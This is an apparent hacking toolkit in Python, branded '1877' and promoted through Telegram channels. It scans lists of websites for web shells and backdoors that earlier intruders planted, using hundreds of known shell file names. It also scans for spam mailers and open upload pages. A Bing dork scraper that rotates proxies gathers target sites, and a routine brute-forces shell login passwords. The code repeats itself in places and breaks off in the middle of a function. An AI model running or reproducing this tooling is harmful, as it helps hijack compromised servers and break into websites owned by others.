#Telegram Channel: https://t.me/webshellswp
import os, requests, threading
from multiprocessing.dummy import Pool, Lock
from bs4 import BeautifulSoup
import time, smtplib, sys, ctypes
from time import sleep
from random import choice
from colorama import Fore
from colorama import Style
from colorama import init
import re
import requests
import subprocess
import hashlib
import os,re,requests,ctypes
from colorama import Fore,init
from multiprocessing.dummy import Pool
from random import choices
url = "http://www.zone-h.org/archive/notifier="
urll = "http://zone-h.org/archive"
user = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
my_cook = {
    "ZHE" : "7a4182e4d7fc736d3cf926b32bd27e8c",
    "PHPSESSID" : "kkcb6n1si8l3h6js1ho3nhpe91"
    }

init(autoreset=True)
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

def Folder(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

Folder('Result')

Bad = 0
Good = 0
pro = 0
mailer = 0
cp = 0
error = 0
password = 0


def clear():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass



def finder(i) :
    global Bad,Good,pro,password,mailer
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    try :
            x = requests.session()
            for script in listaa :
                url = ('https://'+i+'/'+script)
                while True :
                    req_first = x.get(url, headers=head)
                    if ">public_html" in req_first.text :
                        Good = Good + 1
                        print(fg+"Found >> "+url)
                        with open("Result/shell.txt","a") as file :
                            file.write(url+"\n")
                            file.close()
                    elif "<span>Upload file:" in req_first.text :
                        Good = Good + 1
                        print("generator >> "+url)
                        with open("Result/random.txt","a") as gn :
                            gn.write(url+"\n")
                            gn.close()
                    elif 'type="submit" id="_upl" value="Upload">' in req_first.text :
                        Good = Good + 1
                        print("Shell >> "+url)
                        with open("Result/Config.txt","a") as fox :
                            Good = Good + 1
                            fox.write(url+"\n")
                            fox.close()
                    elif 'Leaf PHPMailer' in req_first.text or '>alexusMailer 2.0<' in req_first.text :
                        mailer = mailer + 1
                        print('Mailer >>  '+url)
                        with open('Result/Mailer.txt','a') as mailers :
                            mailers.write(url+'\n')
                            mailers.close()
                    elif 'method=post>Password:' in req_first.text or '<input type=password name=pass' in req_first.text :
                        password = password + 1
                        print('Password : >> '+url)
                        with open('Result/passwod.txt','a') as pa :
                            pa.write(url+'\n')
                            pa.close()
                    elif 'name="uploader" id="uploader">' in req_first.text:
                        good = good +1
                        print('{} VULN PAGE : >>{}'.format(fy,url))
                        with open('Result.txt','a') as fo :
                            fo.write(url+'\n')
                            fo.close()
                    else :
                        Bad = Bad + 1
                        print(fc+"[ + ] "+fr+"1877_NotFound >>> "+i+"")
                        pass
                    break
    except :
        pass

    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW('1877 |Shell- {} |Not-found- {} |Mailer- {}| Password-{}'.format(Good, Bad, mailer, password))
    else :
        sys.stdout.write('\x1b]2; 1877 |Shell- {} |Not Found- {}| Mailer-{}| Password-{}\x07'.format(Good,Bad, mailer, password))

def key_logo():
    print("""

$$\   $$\                       $$\     $$\           
$$$\  $$ |                      $$ |    $$ |          
$$$$\ $$ | $$$$$$\   $$$$$$$\ $$$$$$\   $$ | $$$$$$\  
$$ $$\$$ |$$  __$$\ $$  _____|\_$$  _|  $$ |$$  __$$\ 
$$ \$$$$ |$$$$$$$$ |\$$$$$$\    $$ |    $$ |$$$$$$$$ |
$$ |\$$$ |$$   ____| \____$$\   $$ |$$\ $$ |$$   ____|
$$ | \$$ |\$$$$$$$\ $$$$$$$  |  \$$$$  |$$ |\$$$$$$$\ 
\__|  \__| \_______|\_______/    \____/ \__| \_______|          
                                                                                                                                                                        
                                                                                                                                                     
Telegram Channel : @Rici144
""")

def clear():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass
def finder(i) :
    global Bad,Good,pro,password,mailer
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    try :
            x = requests.session()
            listaa = ['cool.php','upload.aspx','manager.aspx','admin.aspx','0x.aspx',"Global.aspx","0x1877.aspx","z.aspx",'shell.aspx','ok.php''content.php','ups','new-index.php','1index.php','xleet.php','olux.php','page.php','wp-signup.php','wp-user.php','pages.php','admin.php','argazz.php','leafmailer.php','mailer.php','mail.php','default.php','old-index.php','wp-configer.php','wso.php','x.php','lol.php','votes.php','pages.php','contacts.php','LOL.php','index0.php','index00.php','index_old.php','13.php','indexold.php','wp-22.php','wp-ajax.php','wp-security.php','anons79.php','ran.php','kindex.php','wp-content/plugins/ubh/up.php','wordpress/wp-content/plugins/ubh/up.php','index000.php','index3.php','index4.php','index5.php','xxxindex.php','indexxx.php','sh3ll.php','shell.php','shel.php','she.php','shell1.php','shell99.php','w.php','mrd.php','w4k.php','dxshell.php','rootshell.php','safeover.php','n3m3s1s.php','NeMeSiS.php','lNemexix.php','xinfo.php','inj3ct0r.php','sql.php','coc.php','backcookie.php','bypass.php','c99.php','C99.php','c99.PHP','c99_madnet.php','c99_PSych0.php','c99_w4cking.php','C99madShell.php','CasuS.php','cgi.php','enforcer.php','anonym0us.php','perronymous.php','shellnymous.php','goku.php','vegeta.php','Frizell.php','gammer.php','CrystalShell.php','CTTShell.php','pr0f3s0r-php','profesorX.php','Tobitow.php','ctt_sh.php','CWShellDumper.php','CyberShell.php','cybershell.php','CyberSpy5.Asp','CyberSpy5.php','DxShell.php','EFSO_2.php','ekin0x.php','ELMALISEKER.php','Elmaliseker.php','GammaWebShell.php','GammaShell.php','Gamma.php','gfs_sh.php','go-shell.php','superhacker.php','hiddensshell.php','iMHaBiRLiGi.php','iMHaPFtp.php','JspWebshell.php','FTPSHELL.php','KA_uShell.php','kacak.php','KAdot.php','KAdotUniversalShell.php','klasvayv.asp','klasvayv.php','lamashell.php','Liz0ziM.php','load_shell.php','ShellDDos.php','LoaderzWEBShell.php','Loaderz.php','matamu.php','MyShell.php','mysql_tool.php','nshell.php','nstview.php','NTDaddy.php','PHVayv.php','PHANTASMA.php','php-backdoor.php','php-include-w-shell.php','pHpINJ.php','PHPJackal.php','Predator.php','Private-i3lue.php','pws.php','r57_iFX.php','r57_kartal.php','r57_Mohajer22.php','r57shell.php','reader.asp','reader.php','RemExp.asp','RemExp.php','ru24_post_sh.php','s72Shell.php','c100.php','xtremecrip.php','fenix.php','fenixshell.php','safe0ver.php','simple_cmd.php','Sincap.php','SnIpEr_SAShell.php','SnIpEr_SA.php','sosyete.php','tryag.php','WinXShell.php','WorseLinuxShell.php','zehir4.asp','zehir4.php','ZyklonShell.php','kaushell.php','backdoor.php','b4ckdoor.php','Backd00r.php','simshell.php','quick.php','system.php','DB.php','BD.php','db.php','dork.php','user.php','fuck.php','fucking.php','doom.php','error.php','error99.php','pwd.php','sym.php','symlink.php','xp.php','0.php','1.php','2.php','3.php','4.php','5.php','6.php','7.php','8.php','9.php','10.php','11.php','12.php','14.php','15.php','16.php','17.php','18.php','19.php','20.php','21.php','22.php','23.php','24.php','25.php','26.php','27.php','28.php','29.php','30.php','31.php','32.php','33.php','34.php','35.php','36.php','37.php','50.php','66.php','07.php','007.php','1990.php','1991.php','1992.php','2011.php','2012.php','2013.php','2014.php','2015.php','2016.php','123.php','99.php','100.php','666.php','404.php','a.php','b.php','c.php','abc.php','d.php','e.php','f.php','g.php','h.php','i.php','j.php','k.php','l.php','m.php','n.php','o.php','p.php','y.php','z.php','hp.php','gracias.php','bye.php','codigo.php','code.php','symbyp.php','gracias1.php','registrados.php','usuarios_registrados.php','thumb.php','i-47_shell.php','I-47544.php','b374k779.php','b374k.php','porno.php','malware.php','virus.php','firewall.php','tube.php','rtube.php','shelltube.php','lab.php','activate.php','deface.php','defacer.php','defaced.php','llave.php','anon.php','an0n.php','4n0n.php','anonymous.php','an0nym0us.php','anongt.php','anoncol.php','anoncol7.php','fbi.php','face.php','dface.php','gt.php','GT.php','ptm.php','PTM.php','author.php','functions.php','newshell.php','Newshell.php','webshell.cgi','jaguar.php','jaguar.izri','sym/jaguar.izri','ajaxcommandshell.php','GsC_Shell.php','passwd-bypasser.php','Siyanur5x.php','cookie.php','cookier.php','book.php','backtrack.php','ksm.php','KSM.php','mg.php','MG.php','mmg.php','parser.php','parce.php','compa.php','compadre.php','compashell.php','rehacked.php','m4y4.php','elmago.php','beta.php','newfile.php','pt.php','fitler.php','money.php','chido.php','puma.php','PUMA.php','simon.php','apple.php','mitnick.php','mal.php','tigre.php','pigre.php','none.php','love.php','hack.php','h4ck.php','crack.php','cr4ck.php','Hack.php','pisher.php','Pisher.php','pishing.php','phishing.php','hat.php','black.php','jss.php','jb.php','jo.php','jojo.php','jojojo.php','inderexperasp.php','hackeronurshell.php','therules25.php','phpremoteview.php','includewshell.php','atheroz.php','Atheroz.php','atherozhack.php','THA.php','tha.php','libero.php','liber0.php','l1b3r0.php','top.php','set.php','data.php','aat.php','cpanel_cracker.php','cracker_cpanel.php','cracker.php','blackhat.php','blackh0l0.php','white.php','whitehat.php','gray.php','wos.php','sec.php','s3c.php','ja.php','jaja.php','jajaja.php','antichat.php','aZRaiLPhp.php','backupsql.php','c0derzshell.php','angel.php','angelwhitehat.php','vip.php','core.php','c0r3.php','C0r3.php','true.php','pentest.php','fake.php','trolface.php','trol.php','troleo.php','heykir.php','lulzsec.php','LulzSec.php','soft.php','s0ft.php','phpinjectionshell.php','web.php','kaiser.php','breack.php','br34ck.php','breacksecurity.php','xss.php','facebook.php','bounty.php','yea.php','fuckyou.php','on.php','off.php','zombie.php','Zombie.php','z0mbi3.php','bash.php','title.php','b4ck.php','back.php','backs.php','backshell.php','backshellsym.php','reto.php','fuego.php','pin.php','coca.php','marihuana.php','Marihuana.php','mariajuana.php','build.php','secure.php','spam.php','spammer.php','locus.php','crystal.php','test.php','tool.php','testing.php','root.php','ROOT.php','rooting.php','PWNED.php','pwned.php','owned.php','OWNED.php','pwn3d.php','0wn3d.php','wp-db.php','WP-DB.php','config-joomla.php','confih-wordpress.php','zacosmall.php','zeta.php','yeizeta.php','zacosmall.php','teamhacker.php','hackerarmy.php','HackersArmy.php','r57.php','ru24postshell.php','phoenix.php','sniper.php','failed.php','nov.php','nob.php','nub.php','novato.php','nobato.php','open.php','malote.php','okol.php','SEA.php','main.php','AdminGay.php','admingay.php','GAY.php','gay.php','wbn.php','mainbody.php','alert.php','save.php','edit_config.php','delete.php','log.php','adm.php','s72.php','cp.php','xd.php','XD.php','xxx.php','XXX.php','colh.php','colhacker.php','zeus.php','gaza.php','securitypwn.php','fmogro.php','DrSHA6H.php','Dr_SHA6H.php','update.php','lammer.php','juacker.php','jacker.php','JUACKER.php','kaker.php','link.php','linker.php','red.php','C4nh0t0.php','root/system.php','ROOT/system.php','rooting/system.php','ROOTING/system.php','root/c99.php','ROOTING/allsoft.pl','rooting/allsoft.pl','root/allsoft.pl','ROOT/allsoft.pl','PRO/index.php','PRO/cp.php','images/c99.php','images/c100.php','images/fenix.php','images/shell.php','images/shel.php','images/she.php','images/config.php','images/index.php','images/I-47544.php','images/b374k779.php','images/PRO/','images/user.php','images/adm.php','images/root/system.php','images/rooting/allsoft.pl','images/DB.php','images/db.php','images/test.php','images/testing.php','images/fuck.php','images/fucking.php','images/lol.php','images/l0l.php','images/fenix.php','images/backdoor.php','images/backshell.php','images/x.php','images/xd.php','images/xxx.php','images/pwned.php','images/PWNED.php','images/owned.php','images/0wn3d.php','images/0.php','images/1.php','images/123.php','images/sym.php','images/symlink.php','images/root.php','images/rooting.php','images/xtremecrip.php','images/fenix.php','images/fenixshell.php','images/config.php','images/system.php','media/system.php','media/shell.php','media/c99.php','media/c100.php','media/DB.php','media/fuck.php','media/fucking.php','media/lol.php','media/fenix.php','media/x.php','media/xxx.php','media/xd.php','media/pwned.php','media/PWNED.php','media/owned.php','media/OWNED.php','media/0wn3d.php','media/wnd.php','media/pwd.php','media/0.php','media/symlink.php','media/root.php','media/xtremecrip.php','media/fenix.php','edia/fenixshell.php','media/system.php','media/sym.php','administrator/system.php','administrator/shell.php','administrator/shel.php','administrator/she.php','administrator/c99.php','administrator/wbn.php','administrator/c100.php','administrator/DB.php','administrator/fuck.php','administrator/fucking.php','administrator/lol.php','administrator/xxx.php','administrator/fenixshell.php','administrator/phoenix.php','administrator/x.php','administrator/xd.php','administrator/pwned.php','administrator/PWNED.php','administrator/owned.php','administrator/OWNED.php','administrator/0.php','administrator/1.php','administrator/7.php','administrator/123.php','administrator/adm.php','administrator/root.php','administrator/symlink.php','administrator/symlink/','administrator/sym.php','administrator/config.php','administrator/xtremecrip.php','templates/root/system.php','templates/rooting/system.php','templates/allsoft.pl','templates/PRO/index.php','templates/PRO/404.php','templates/PRO/cp.php','templates/cp.php','templates/system.php','templates/shell.php','templates/c99.php','templates/DB.php','templates/fuck.php','templates/fucked.php','templates/fucking.php','templates/lol.php','templates/FUCK.php','templates/fenix.php','templates/fenixshell.php','templates/proshell.php','templates/phoenix.php','templates/x.php','templates/army.php','templates/python.php','templates/xxx.php','templates/pwned.php','templates/pwn.php','templates/PWNED.php','templates/owned.php','templates/0wn3d.php','templates/own.php','templates/OWNED.php','templates/0.php','templates/root.php','templates/ROOT.php','templates/symlink.php','templates/sym.php','templates/config_DB.php','templates/config.php','templates/xtremecrip.php','templates/default_theme/PRO/index.php','templates/default_theme/PRO/cp.php','templates/default_theme/allsoft.pl','templates/default_theme/symlink.pl','templates/default_theme/system.php','templates/default_theme/shell.php','templates/default_theme/c99.php','templates/default_theme/DB.php','templates/default_theme/fuck.php','templates/default_theme/fucking.php','templates/default_theme/lol.php','alfa.php','c99.php','mini.php','a.php','a.php','b.php','c.php','d.php','e.php','f.php','g.php','h.php','i.php','g.php','k.php','l.php','m.php','n.php','o.php','p.php','q.php','r.php','s.php','t.php','u.php','v.php','w.php','x.php','xleet.php','olux.php','ttshop.php','y.php','z.php','fox.php','f0x.php','anonymous_fox.php','anonymous_f0x.php']#ADD ANY MUCH 
            for script in listaa :
                url = (i+"/"+script)
                while True :
                    req_first = x.get(url, headers=head)
                    if ">public_html" in req_first.text :
                        Good = Good + 1
                        print(fg+"Found >> "+url)
                        with open("Result/shell.txt","a") as file :
                            file.write(url+"\n")
                            file.close()
                    elif "<span>Upload file:" in req_first.text :
                        Good = Good + 1
                        print("generator >> "+url)
                        with open("Result/random.txt","a") as gn :
                            gn.write(url+"\n")
                            gn.close()
                    elif ">File Upload" in req_first.text :
                        Good = Good + 1
                        print("Shell >> "+url)
                        with open("Result/Config.txt","a") as fox :
                            Good = Good + 1
                            fox.write(url+"\n")
                            fox.close()
                    elif 'Leaf PHPMailer' in req_first.text or '>alexusMailer 2.0<' in req_first.text :
                        mailer = mailer + 1
                        print('Mailer >>  '+url)
                        with open('Result/Mailer.txt','a') as mailers :
                            mailers.write(url+'\n')
                            mailers.close()
                    elif 'method=post>Password:' in req_first.text or '<input type=password name=pass' in req_first.text :
                        password = password + 1
                        print('Password : >> '+url)
                        with open('Result/passwod.txt','a') as pa :
                            pa.write(url+'\n')
                            pa.close()
                    else :
                        Bad = Bad + 1
                        print(fc+"[ + ] "+fr+"Not found >>> "+i+"  - Telegram @Rici144 "+script)
                        pass
                    break
    except :
        pass
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW('1877|Shell-{}|Not-found-{}|Mailer-{}|Password-{}'.format(Good, Bad, mailer, password))
    else :
        sys.stdout.write('\x1b]2; 1877|Shell-{}|Not Found-{}| Mailer-{}|Password-{}\x07'.format(Good,Bad, mailer, password))
def run() :
    key_logo()
    clear()
    print("""  

$$\   $$\                       $$\     $$\           
$$$\  $$ |                      $$ |    $$ |          
$$$$\ $$ | $$$$$$\   $$$$$$$\ $$$$$$\   $$ | $$$$$$\  
$$ $$\$$ |$$  __$$\ $$  _____|\_$$  _|  $$ |$$  __$$\ 
$$ \$$$$ |$$$$$$$$ |\$$$$$$\    $$ |    $$ |$$$$$$$$ |
$$ |\$$$ |$$   ____| \____$$\   $$ |$$\ $$ |$$   ____|
$$ | \$$ |\$$$$$$$\ $$$$$$$  |  \$$$$  |$$ |\$$$$$$$\ 
\__|  \__| \_______|\_______/    \____/ \__| \_______|          
                                                                                                                                                                        
                                                                                                                                                     
Telegram Channel : @Rici144


                          \n \n""")
    file_name = input("URLS LIST ?  : ")
    op = open(file_name,'r').read().splitlines()
    TEXTList = [list.strip() for list in op]
    p = Pool(int(input('THREAD : ')))
    p.map(finder, TEXTList)

###################

import os,re,requests,ctypes
from colorama import Fore,init
from multiprocessing.dummy import Pool
from random import choice
if os.name == "nt":
    os.system("cls")
else:
    os.system("clear")

init(convert=True)

class settings:
    y = Fore.YELLOW
    r = Fore.RED
    b = Fore.BLUE


def clean():
    lines_seen = set()
    infile = open('sitelist.txt', "r")
    for line in infile:
        if line not in lines_seen:
            outfile.write(line)
            lines_seen.add(line)
    infile.close()



binglist = {"http://www.bing.com/search?q=&count=50&first=1",
"http://www.bing.com/search?q=&count=50&first=51",
"http://www.bing.com/search?q=&count=50&first=101",
"http://www.bing.com/search?q=&count=50&first=151",
"http://www.bing.com/search?q=&count=50&first=201",
"http://www.bing.com.br/search?q=&count=50&first=1",
"http://www.bing.com.br/search?q=&count=50&first=51",
"http://www.bing.com.br/search?q=&count=50&first=101",
"http://www.bing.at/search?q=&count=50&first=1",
"http://www.bing.at/search?q=&count=50&first=51",
"http://www.bing.at/search?q=&count=50&first=101",
"http://www.bing.be/search?q=&count=50&first=1",
"http://www.bing.be/search?q=&count=50&first=51",
"http://www.bing.be/search?q=&count=50&first=101",
"http://www.bing.cl/search?q=&count=50&first=1",
"http://www.bing.cl/search?q=&count=50&first=51",
"http://www.bing.cl/search?q=&count=50&first=101",
"http://www.bing.co.at/search?q=&count=50&first=1",
"http://www.bing.co.at/search?q=&count=50&first=51",
"http://www.bing.co.at/search?q=&count=50&first=101",
"http://www.bing.com.au/search?q=&count=50&first=1",
"http://www.bing.com.au/search?q=&count=50&first=51",
"http://www.bing.com.au/search?q=&count=50&first=101",
"http://www.bing.com.cn/search?q=&count=50&first=1",
"http://www.bing.com.cn/search?q=&count=50&first=51",
"http://www.bing.com.cn/search?q=&count=50&first=101",
"http://www.bing.cz/search?q=&count=50&first=1",
"http://www.bing.cz/search?q=&count=50&first=51",
"http://www.bing.cz/search?q=&count=50&first=101",
"http://www.bing.de/search?q=&count=50&first=1",
"http://www.bing.de/search?q=&count=50&first=51",
"http://www.bing.de/search?q=&count=50&first=101",
"http://www.bing.dk/search?q=&count=50&first=1",
"http://www.bing.dk/search?q=&count=50&first=51",
"http://www.bing.dk/search?q=&count=50&first=101",
"http://www.bing.ca/search?q=&count=50&first=1",
"http://www.bing.ca/search?q=&count=50&first=51",
"http://www.bing.ca/search?q=&count=50&first=101",
"http://www.bing.sg/search?q=&count=50&first=1",
"http://www.bing.sg/search?q=&count=50&first=51",
"http://www.bing.sg/search?q=&count=50&first=101",
"http://www.bing.se/search?q=&count=50&first=1",
"http://www.bing.se/search?q=&count=50&first=51",
"http://www.bing.se/search?q=&count=50&first=101",
"http://www.bing.pl/search?q=&count=50&first=1",
"http://www.bing.pl/search?q=&count=50&first=51",
"http://www.bing.pl/search?q=&count=50&first=101",
"http://www.bing.no/search?q=&count=50&first=1",
"http://www.bing.no/search?q=&count=50&first=51",
"http://www.bing.no/search?q=&count=50&first=101",
"http://www.bing.nl/search?q=&count=50&first=1",
"http://www.bing.nl/search?q=&count=50&first=51",
"http://www.bing.nl/search?q=&count=50&first=101",
"http://www.bing.net.nz/search?q=&count=50&first=1",
"http://www.bing.net.nz/search?q=&count=50&first=51",
"http://www.bing.net.nz/search?q=&count=50&first=101",
"http://www.bing.lv/search?q=&count=50&first=1",
"http://www.bing.lv/search?q=&count=50&first=51",
"http://www.bing.lv/search?q=&count=50&first=101",
"http://www.bing.lt/search?q=&count=50&first=1",
"http://www.bing.lt/search?q=&count=50&first=51",
"http://www.bing.lt/search?q=&count=50&first=101",
"http://www.bing.it/search?q=&count=50&first=1",
"http://www.bing.it/search?q=&count=50&first=51",
"http://www.bing.it/search?q=&count=50&first=101",
"http://www.bing.is/search?q=&count=50&first=1",
"http://www.bing.is/search?q=&count=50&first=51",
"http://www.bing.is/search?q=&count=50&first=101",
"http://www.bing.in/search?q=&count=50&first=1",
"http://www.bing.in/search?q=&count=50&first=51",
"http://www.bing.in/search?q=&count=50&first=101",
"http://www.bing.ie/search?q=&count=50&first=1",
"http://www.bing.ie/search?q=&count=50&first=51",
"http://www.bing.ie/search?q=&count=50&first=101",
"http://www.bing.hu/search?q=&count=50&first=1",
"http://www.bing.hu/search?q=&count=50&first=51",
"http://www.bing.hu/search?q=&count=50&first=101",
"http://www.bing.fr/search?q=&count=50&first=1",
"http://www.bing.fr/search?q=&count=50&first=51",
"http://www.bing.fr/search?q=&count=50&first=101",
"http://www.bing.com.sg/search?q=&count=50&first=1",
"http://www.bing.com.sg/search?q=&count=50&first=51",
"http://www.bing.com.sg/search?q=&count=50&first=101",
"http://www.bing.co.uk/search?q=&count=50&first=1",
"http://www.bing.co.uk/search?q=&count=50&first=51",
"http://www.bing.co.uk/search?q=&count=50&first=101",
"http://www.bing.co.nz/search?q=&count=50&first=1",
"http://www.bing.co.nz/search?q=&count=50&first=51",
"http://www.bing.co.nz/search?q=&count=50&first=101",
"http://www.bing.co.jp/search?q=&count=50&first=1",
"http://www.bing.co.jp/search?q=&count=50&first=51",
"http://www.bing.co.jp/search?q=&count=50&first=101",
"http://www.bing.ch/search?q=&count=50&first=1",
"http://www.bing.ch/search?q=&count=50&first=51",
"http://www.bing.ch/search?q=&count=50&first=101",
"http://www.bing.com.tr/search?q=&count=50&first=1",
"http://www.bing.com.tr/search?q=&count=50&first=51",
"http://www.bing.com.tr/search?q=&count=50&first=101",
"http://www.bing.com.pr/search?q=&count=50&first=1",
"http://www.bing.com.pr/search?q=&count=50&first=51",
"http://www.bing.com.pr/search?q=&count=50&first=101",
"http://www.bing.com.ar/search?q=&count=50&first=1",
"http://www.bing.com.ar/search?q=&count=50&first=51",
"http://www.bing.com.ar/search?q=&count=50&first=101",
"http://www.bing.com.co/search?q=&count=50&first=1",
"http://www.bing.com.co/search?q=&count=50&first=51",
"http://www.bing.com.co/search?q=&count=50&first=101",
"http://www.bing.com.es/search?q=&count=50&first=1",
"http://www.bing.com.es/search?q=&count=50&first=51",
"http://www.bing.com.es/search?q=&count=50&first=101",
"http://www.bing.fi/search?q=&count=50&first=1",
"http://www.bing.fi/search?q=&count=50&first=51",
"http://www.bing.fi/search?q=&count=50&first=101",
"http://www.bing.bo/search?q=&count=50&first=1",
"http://www.bing.bo/search?q=&count=50&first=51",
"http://www.bing.bo/search?q=&count=50&first=101",
"http://www.bing.com.do/search?q=&count=50&first=1",
"http://www.bing.com.do/search?q=&count=50&first=51",
"http://www.bing.com.do/search?q=&count=50&first=101",
"http://www.bing.gr/search?q=&count=50&first=1",
"http://www.bing.gr/search?q=&count=50&first=51",
"http://www.bing.gr/search?q=&count=50&first=101",
"http://www.bing.com.hk/search?q=&count=50&first=1",
"http://www.bing.com.hk/search?q=&count=50&first=51",
"http://www.bing.com.hk/search?q=&count=50&first=101",
"http://www.bing.com.hr/search?q=&count=50&first=1",
"http://www.bing.com.hr/search?q=&count=50&first=51",
"http://www.bing.com.hr/search?q=&count=50&first=101",
"http://www.bing.com.mx/search?q=&count=50&first=1",
"http://www.bing.com.mx/search?q=&count=50&first=51",
"http://www.bing.com.mx/search?q=&count=50&first=101",
"http://www.bing.com.my/search?q=&count=50&first=1",
"http://www.bing.com.my/search?q=&count=50&first=51",
"http://www.bing.com.my/search?q=&count=50&first=101",
"http://www.bing.ph/search?q=&count=50&first=1",
"http://www.bing.ph/search?q=&count=50&first=51",
"http://www.bing.ph/search?q=&count=50&first=101",
"http://www.bing.com.pr/search?q=&count=50&first=1",
"http://www.bing.com.pr/search?q=&count=50&first=51",
"http://www.bing.com.pr/search?q=&count=50&first=101",
"http://www.bing.pt/search?q=&count=50&first=1",
"http://www.bing.pt/search?q=&count=50&first=51",
"http://www.bing.pt/search?q=&count=50&first=101",
"http://www.bing.com.ro/search?q=&count=50&first=1",
"http://www.bing.com.ro/search?q=&count=50&first=51",
"http://www.bing.com.ro/search?q=&count=50&first=101",
"http://www.bing.ru/search?q=&count=50&first=1",
"http://www.bing.ru/search?q=&count=50&first=51",
"http://www.bing.ru/search?q=&count=50&first=101",
"http://www.bing.com.sa/search?q=&count=50&first=1",
"http://www.bing.com.sa/search?q=&count=50&first=51",
"http://www.bing.com.sa/search?q=&count=50&first=101",
"http://www.bing.si/search?q=&count=50&first=1",
"http://www.bing.si/search?q=&count=50&first=51",
"http://www.bing.si/search?q=&count=50&first=101",
"http://www.bing.sk/search?q=&count=50&first=1",
"http://www.bing.sk/search?q=&count=50&first=51",
"http://www.bing.sk/search?q=&count=50&first=101",
"http://www.bing.com.ua/search?q=&count=50&first=1",
"http://www.bing.com.ua/search?q=&count=50&first=51",
"http://www.bing.com.ua/search?q=&count=50&first=101",
"http://www.bing.com.uy/search?q=&count=50&first=1",
"http://www.bing.com.uy/search?q=&count=50&first=51",
"http://www.bing.com.uy/search?q=&count=50&first=101",
"http://www.bing.vn/search?q=&count=50&first=1",
"http://www.bing.vn/search?q=&count=50&first=51",
"http://www.bing.vn/search?q=&count=50&first=101"}
site = 0
error = 0
def dorkscan(dork):

    global site,error
    for bing in binglist:
        bingg = bing.replace("&count",dork + "&count")
        try:
          x = requests.session()
          r = x.get(bingg)
          x.proxies = {'http': 'socks4://{}'.format(choice(proxy)),'https': 'socks4://{}'.format(choice(proxy))}
          checktext = r.text
          checktext = checktext.replace("<strong>","")
          checktext = checktext.replace("</strong>","")
          checktext = checktext.replace('<span dir="ltr">','')
          checksites = re.findall('<cite>(.*?)</cite>',checktext)
          for sites in checksites:
            #site = site + 1
            sites = sites.replace("http://","protocol1")
            sites = sites.replace("https://","protocol2")
            sites = sites + "/"
            site = sites[:sites.find("/")+0]
            site = site.replace("protocol1","http://")
            site = site.replace("protocol2","https://")
            site = site.replace('<span class="" dir="ltr">','')
            if "http" in site:
                print(str("1877_SiteGrabber >>> " +str(site) + str("/")))
            else:
                print(str("1877_SiteGrabber >>> ") + str("http://") + str(site) + str("/"))
            try:
                with open("1877_sitelist.txt","a") as f:
                    if "http" in site:
                        #site = site + 1
                        f.write(site + "/" + "\n")
                    else:
                        #site = site + 1
                        f.write("http://" + site + "/" + "\n")
            except:
                #error = error + 1
                pass
        except:
            #error = error + 1
            pass




def ok() :
    os.system('cls')
    print("""SiteGrabber By Dorklist
    """.format(settings.y,settings.r,settings.y,settings.r,settings.y,settings.r,settings.y,settings.r,settings.y,settings.r,settings.y))

    dorklist = input("Dorklist - [dork.txt file] >> : ".format(settings.r,settings.y))
    global proxy
    dorks = open(dorklist, 'r',errors='ignore').read().splitlines()
    pro = input('Proxy file - [proxy.txt file] >> : ')
    prox = open(pro,'r',errors='ignore').read().splitlines()
    proxy = [items.strip() for items in prox]
    print("\n[SiteGrabber by using dork has been started please wait...]".format(settings.r,settings.y))
    pp = Pool(50)
    pr = pp.map(dorkscan,dorks)

def crack_password():
    x = requests.session()
    urll = input('URL FOR CRACK PASSWORD : ')
    passw = open((input('passwordlist : ')), 'r', errors='ignore').read().splitlines()
    for passs in passw:
        data = {'pass': passs}
        send = x.post(urll, data=data).text
        if 'method=post>Password:' in send:
            print('PASSWORD-false : ' + passs)
        else:
            print('password-True : ' + passs)
            with open('TRue.txt', 'a') as (output):
                output.write(passw + '\n')


def Folder(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)


Folder('Result_1877x')

def cleans():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


def start(i):
    i = i.strip()
    user = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    path = ['/uploads/up.php', '/sites/all/libraries/elfinder/elfinder.php.html', '/images/vuln.php', '/ups.php', '/up.php', '/wp-content/upload.php', '/upload.php', '/media-admin.php']
    for paths in path:
        x = requests.session()
        url = i + paths
        try:
            check = x.get(url, headers=user, timeout=1)
            if 'elfinder.css' in check.text:
                print('{0}[ Upload-Page ] >> {1}'.format(fg, url))
                with open('Result/Admin-Manager.txt', 'a') as (vulns):
                    vulns.write(url + '\n')
                    vulns.close()
            else:
                if 'Upload file:' in check.text:
                    print('{0}[ Shell :) ] >> {1}'.format(fc, url))
                    with open('Result/Shell.txt', 'a') as (ff):
                        ff.write(url + '\n')
                        ff.close()
                else:
                    if 'type="submit" id="_upl" value="Upload">' in check.text:
                        print('{0}[ Upload-Page :) ] >> {1}'.format(fy, url))
                        with open('Result/Ready_For_Upload.txt', 'a') as (a):
                            a.write(url + '\n')
                            a.close()
                    else:
                        if 'name="uploader" id="uploader">' in check.text:
                            print('{0}[ Upload-Page :) ] >> {1}'.format(sd, url))
                            with open('Result/Ready_For_Upload1.txt', 'a') as (m):
                                m.write(url + '\n')
                                m.close()
                        else:
                            if 'File and Folder Permissions Check' in check.text:
                                print('{}File Manager :) => {} '.format(fw, url))
                                with open('Result/Admin_page.txt', 'a') as (e):
                                    e.write(url + '\n')
                                    e.close()
                            else:
                                print('{0}[ Not Vuln :( ] >>> {1}'.format(fr, i))
        except:
            pass


def x1877():
    global file_name
    print("""


$$\   $$\                       $$\     $$\           
